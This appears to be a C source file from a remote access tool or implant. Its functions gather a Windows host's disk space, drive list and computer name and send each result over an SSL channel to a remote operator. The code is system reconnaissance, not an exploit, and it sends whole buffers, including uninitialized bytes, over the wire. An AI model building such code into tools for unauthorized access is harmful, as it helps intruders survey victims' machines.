#include "Variables.h"

int DiskSpace(SSL *ssl)
{
	char Success[256] = "";
	char Error[] = "\033[1;31m[-] Can't get diskspace.\033[0m\n";

	int GotAll = 0;
	DWORD SectorsPerCluster = 0;
	DWORD BytesPerSector = 0;
	DWORD NumberOfFreeClusters = 0;
	DWORD TotalNumberOfClusters = 0;
	GotAll = GetDiskFreeSpaceA(NULL, &SectorsPerCluster, &BytesPerSector, &NumberOfFreeClusters, &TotalNumberOfClusters);

	if (GotAll == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return EXIT_FAILURE;
	}

	double GB = 1073741824.0;
	double FreeGBs = (SectorsPerCluster * BytesPerSector * (double)NumberOfFreeClusters) / GB;
	double TotalGBs = (SectorsPerCluster * BytesPerSector * (double)TotalNumberOfClusters) / GB;

	snprintf(Success, sizeof(Success), "GBs (Total/Free) %.3f / %.3f | SectorsPerCluster: %lu | BytesPerSector: %lu | FreeClusters: %lu | TotalClusters: %lu\n", TotalGBs, FreeGBs, SectorsPerCluster, BytesPerSector, NumberOfFreeClusters, TotalNumberOfClusters);

	SSL_write(ssl, Success, sizeof(Success));
	return EXIT_SUCCESS;
}

int EnumDrives(SSL *ssl)
{
	char Success[600] = "";
	char RemoteDrives[128] = "";
	char FixedDrives[128] = "";
	char RemovableDrives[128] = "";
	char CDROMDrives[128] = "";
	char Error[] = "\033[1;31m[-] Failed.\033[0m\n";

	DWORD VolumesBITMASK = GetLogicalDrives();
	if (VolumesBITMASK == 0)
	{
		SSL_write(ssl, Error, sizeof(Error));
		return EXIT_FAILURE;
	}

	for (int i = 0; i < 26; i++)
	{
		if (VolumesBITMASK & (1 << i))
		{
			char DriveLetter[4];
			snprintf(DriveLetter, sizeof(DriveLetter), "%c:\\", 'A' + i);
			UINT DriveType = GetDriveType(DriveLetter);

			if (DriveType == DRIVE_REMOTE)
			{
				strncat(RemoteDrives, DriveLetter, sizeof(RemoteDrives) - strlen(RemoteDrives) - 1);
			}
			else if (DriveType == DRIVE_FIXED)
			{
				strncat(FixedDrives, DriveLetter, sizeof(FixedDrives) - strlen(FixedDrives) - 1);
			}
			else if (DriveType == DRIVE_REMOVABLE)
			{
				strncat(RemovableDrives, DriveLetter, sizeof(RemovableDrives) - strlen(RemovableDrives) - 1);
			}
			else if (DriveType == DRIVE_CDROM)
			{
				strncat(CDROMDrives, DriveLetter, sizeof(CDROMDrives) - strlen(CDROMDrives) - 1);
			}
		}
	}

	snprintf(Success, sizeof(Success), "Volumes (BITMASK): %lu | NonRemovable_DRIVES: %s | Removable_DRIVES: %s | Remote_DRIVES: %s | CDROM_DRIVES: %s\n", VolumesBITMASK, FixedDrives, RemovableDrives, RemoteDrives, CDROMDrives);
	SSL_write(ssl, Success, sizeof(Success));
	return EXIT_SUCCESS;
}

int PrintComputerName(SSL *ssl)
{
	char Success[] = "\033[0;35m[+] HostName : \033[0m";
	char Error[] = "\033[1;31m[-] Can't Get HostName. Try systeminfo.\033[0m\n";
	char HostName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(HostName);

	if (GetComputerNameA(HostName, &size) != 0)
	{
		char Buffer[512];
		snprintf(Buffer, sizeof(Buffer), "%s%s\n", Success, HostName);
		SSL_write(ssl, Buffer, sizeof(Buffer));
		return EXIT_SUCCESS;
	}

	SSL_write(ssl, Error, sizeof(Error));
	return EXIT_FAILURE;
}
